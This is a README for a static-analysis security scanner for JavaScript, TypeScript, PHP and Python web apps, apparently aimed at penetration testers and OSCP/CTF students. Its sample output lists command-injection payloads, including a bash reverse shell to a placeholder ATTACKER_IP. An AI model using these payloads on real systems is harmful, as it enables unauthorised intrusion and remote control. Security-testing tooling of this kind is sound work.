# 🔒 Web Application Security Scanner

Offline static analysis tool for identifying security vulnerabilities in **JavaScript**, **TypeScript**, **PHP**, and **Python** web applications. Includes exploitation guidance and built-in cheatsheets for penetration testing.

## Features

- **🔍 120+ Security Rules**: Covers OWASP Top 10 and common vulnerability patterns
- **🌐 Multi-Language Support**: JavaScript, TypeScript, PHP, Python (Flask/Django)
- **⚡ Fast Scanning**: Multi-threaded file scanning with regex-based pattern matching
- **📊 Multiple Report Formats**: Terminal, JSON, CSV, and interactive HTML reports
- **⚔️ Exploitation Guidance**: Step-by-step exploitation instructions for each vulnerability
- **📋 Built-in Cheatsheets**: Quick reference for SSTI, SQLi, CMDi, LFI, SSRF, XSS, JWT, Deserialization
- **🔎 Custom Pattern Search**: Grep-like search for custom patterns across codebase
- **🛡️ Remediation Advice**: Clear guidance on how to fix each issue
- **🔌 Offline Operation**: Works completely offline - no internet required
- **🎯 CWE Mapping**: All findings mapped to Common Weakness Enumeration IDs

## Quick Start

```bash
# Basic scan
python scanner.py /path/to/project

# Scan with vendor/third-party directories (for full app analysis)
python scanner.py . --include-vendor

# Quick overview (brief mode)
python scanner.py . --brief --severity HIGH

# Search for custom patterns
python scanner.py . --grep "password|secret|api_key"

# Show SSTI exploitation cheatsheet
python scanner.py --cheatsheet ssti
```

## Vulnerability Categories

### JavaScript/TypeScript (52 rules)

| Category | Examples |
|----------|----------|
| **Command Injection** | exec(), eval(), child_process |
| **SQL Injection** | String concatenation in queries |
| **NoSQL Injection** | MongoDB operator injection |
| **XSS** | innerHTML, dangerouslySetInnerHTML |
| **Path Traversal** | File operations with user input |
| **SSRF** | HTTP requests with user-controlled URLs |
| **Authentication** | Hardcoded credentials, JWT issues |
| **Privilege Escalation** | Backdoor URL params, insecure string matching |
| **Information Disclosure** | AWS keys, API tokens, private keys |
| **Prototype Pollution** | Object.assign, deep merge |
| **Insecure Deserialization** | node-serialize vulnerabilities |
| **CORS Misconfiguration** | Allow-Origin: * |
| **Weak Cryptography** | MD5, SHA1, hardcoded keys |

### PHP (40 rules)

| Category | Examples |
|----------|----------|
| **Command Injection** | system(), exec(), passthru(), backticks |
| **Code Injection** | eval(), preg_replace /e, create_function() |
| **SQL Injection** | mysqli_query, PDO without prepared statements |
| **File Inclusion** | include(), require() with user input (LFI/RFI) |
| **Path Traversal** | file_get_contents(), fopen() with user paths |
| **File Upload** | Unrestricted move_uploaded_file() |
| **XSS** | echo/print with unsanitized $_GET/$_POST |
| **Insecure Deserialization** | unserialize() with user input |
| **SSTI** | Twig/Blade template injection |
| **Host Header Injection** | HTTP_X_FORWARDED_HOST without validation |
| **SSRF** | file_get_contents(), curl with user URLs |
| **XXE** | simplexml_load_string, DOMDocument |
| **LDAP Injection** | ldap_search with user input |
| **Type Juggling** | Weak comparison (==) for auth |
| **Session Fixation** | Missing session_regenerate_id() |

### Python (28 rules)

| Category | Examples |
|----------|----------|
| **Command Injection** | os.system(), subprocess with shell=True |
| **Code Injection** | eval(), exec() with user input |
| **SQL Injection** | cursor.execute() with string formatting |
| **SSTI** | render_template_string() with user input |
| **Flask Debug Mode** | app.run(debug=True) - Werkzeug RCE |
| **Path Traversal** | open(), send_file() with user paths |
| **Insecure Deserialization** | pickle.loads(), yaml.load() |
| **SSRF** | requests.get() with user URLs |
| **XXE** | etree.parse(), xml.dom |
| **Weak Cryptography** | md5/sha1 for passwords, random module |
| **Hardcoded Secrets** | SECRET_KEY, passwords in code |
| **JWT Vulnerabilities** | verify=False, none algorithm |

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/code-scanner.git
cd code-scanner

# No additional dependencies required (uses Python standard library)
# Python 3.7+ required

# Make executable
chmod +x scanner.py
```

## Usage

### Basic Scan

```bash
# Scan a directory
python scanner.py /path/to/your/project

# Scan current directory
python scanner.py .

# Scan a single file
python scanner.py /path/to/file.js

# Include vendor/third-party directories (OSCP: scan everything!)
python scanner.py . --include-vendor
```

### Filter by Severity

```bash
# Only show HIGH and CRITICAL findings
python scanner.py . --severity HIGH

# Show all findings including INFO
python scanner.py . --severity INFO
```

### Output Modes

```bash
# Brief mode - compact output for quick triage
python scanner.py . --brief

# Full output with exploitation guidance (default)
python scanner.py .

# Verbose mode (includes remediation)
python scanner.py . --verbose

# Hide exploitation guidance
python scanner.py . --no-exploitation
```

### Export Reports

```bash
# Export to JSON
python scanner.py . --output report.json

# Export to CSV (for notes/spreadsheets)
python scanner.py . --csv findings.csv

# Export to interactive HTML
python scanner.py . --html report.html

# All formats at once
python scanner.py . --output report.json --csv findings.csv --html report.html
```

### Exploitation Cheatsheets

Quick reference for common exploitation techniques:

```bash
# List available cheatsheets
python scanner.py --cheatsheet list

# Show specific cheatsheet
python scanner.py --cheatsheet ssti    # Server-Side Template Injection
python scanner.py --cheatsheet sqli    # SQL Injection
python scanner.py --cheatsheet cmdi    # Command Injection
python scanner.py --cheatsheet lfi     # Local File Inclusion
python scanner.py --cheatsheet ssrf    # Server-Side Request Forgery
python scanner.py --cheatsheet xss     # Cross-Site Scripting
python scanner.py --cheatsheet jwt     # JWT Token Attacks
python scanner.py --cheatsheet deser   # Deserialization
```

### Custom Pattern Search (Grep Mode)

Search for custom patterns across the codebase:

```bash
# Search for potential secrets
python scanner.py . --grep "password|secret|api_key|token"

# Search for interesting functions
python scanner.py . --grep "eval|exec|system|shell"

# Search for comments with security implications
python scanner.py . --grep "TODO|FIXME|XXX|HACK|BUG"

# Include vendor directories in search
python scanner.py . --grep "admin" --include-vendor
```

### Advanced Options

```bash
# Exclude specific rules
python scanner.py . --exclude-rules CMD-001,SQL-001

# Increase parallel workers
python scanner.py . --workers 8

# Auto-unminify minified JS files before scanning
python scanner.py . --unminify

# Disable colors (for piping)
python scanner.py . --no-color > results.txt

# List all available rules
python scanner.py --list-rules
```

## JavaScript Unminifier

The scanner includes a standalone unminifier module for beautifying minified JavaScript before security analysis.

```bash
# Unminify a single file
python unminify.py bundle.min.js

# Specify output file
python unminify.py bundle.min.js -o readable.js

# Auto-unminify during scan
python scanner.py . --unminify
```

## Example Output

### Brief Mode
```
/app/api/utils.js:45:CRITICAL:Command Injection via child_process.exec
/app/auth/login.js:23:HIGH:Hardcoded Password
/app/db/query.js:67:CRITICAL:SQL Injection via String Concatenation
```

### Full Mode
```
═══════════════════════════════════════════════════════════════════════
📊 SCAN SUMMARY
═══════════════════════════════════════════════════════════════════════

  Target:         /home/user/webapp
  Files Scanned:  156
  Duration:       2.34 seconds
  Rules Loaded:   120 rules across 34 categories
  Total Findings: 12

  Findings by Severity:
    ● CRITICAL: 2
    ● HIGH: 5
    ● MEDIUM: 4
    ● LOW: 1

═══════════════════════════════════════════════════════════════════════
🚨 VULNERABILITY FINDINGS
═══════════════════════════════════════════════════════════════════════

[1] Command Injection via child_process.exec
    Severity: CRITICAL | Category: Command Injection | CWE-78
    📁 /home/user/webapp/api/utils.js:45

    Code Context:
      const filename = req.query.file;
    ➤ exec(`convert ${filename} output.png`);
      res.send('Done');

    ⚔️  EXPLOITATION GUIDANCE:
    ╔════════════════════════════════════════════════════════════════╗
    ║  COMMAND INJECTION                                             ║
    ╚════════════════════════════════════════════════════════════════╝

    PAYLOADS:
    ; id
    | id
    `id`
    $(id)
    ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    ...
```

## File Types Scanned

| Language | Extensions |
|----------|------------|
| JavaScript/TypeScript | `.js`, `.ts`, `.tsx`, `.jsx`, `.mjs`, `.cjs` |
| PHP | `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.inc` |
| Python | `.py`, `.pyw` |

## Directories Excluded

By default, the scanner excludes:
- `node_modules/`, `vendor/` (use `--include-vendor` to scan)
- `.git/`, `dist/`, `build/`, `.next/`, `coverage/`
- Minified files (`*.min.js`)

## OSCP Tips

For OSCP and CTF challenges:

1. **Always use `--include-vendor`** - vulnerabilities are often in third-party code
2. **Use `--brief` for quick triage** - identify targets fast
3. **Export to CSV** - keep notes organized
4. **Use `--grep` for secrets** - find hardcoded credentials
5. **Check cheatsheets** - `--cheatsheet ssti` etc. for quick payloads

```bash
# Full OSCP scan workflow
python scanner.py /target --include-vendor --severity MEDIUM --csv notes.csv
python scanner.py /target --grep "password|secret|key|token" --include-vendor
python scanner.py --cheatsheet ssti  # When you find template injection
```

## Ethical Use

⚠️ **This tool is intended for ethical penetration testing only.**

- Only scan code you have permission to test
- Use findings responsibly to improve security
- Do not use exploitation guidance against systems without authorization
- Report vulnerabilities responsibly to affected parties

## Contributing

Contributions are welcome! To add new rules:

1. Add your rule to `rules.py`, `rules_php.py`, or `rules_python.py`
2. Include comprehensive exploitation guidance
3. Map to appropriate CWE ID
4. Test against sample vulnerable code

## License

MIT License - See LICENSE file for details.

## Acknowledgments

Rules inspired by:
- [Semgrep Security Rules](https://semgrep.dev/docs/)
- [OWASP Top 10](https://owasp.org/Top10/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [CWE Database](https://cwe.mitre.org/)
